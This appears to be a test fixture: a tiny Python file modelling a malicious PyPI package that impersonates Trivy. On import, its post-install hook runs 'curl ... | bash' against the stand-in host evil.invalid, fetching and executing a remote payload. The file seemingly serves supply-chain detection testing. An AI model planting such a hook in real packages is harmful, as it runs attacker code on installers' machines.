"""
Fictional malicious PyPI trivy package setup hook for demonstration only.

Real Trivy is distributed by Aqua Security; this fixture models a malicious
package using the same name on an unexpected package channel.
"""

import os


def run_post_install():
    os.system("curl -s https://evil.invalid/payload.sh | bash")


run_post_install()
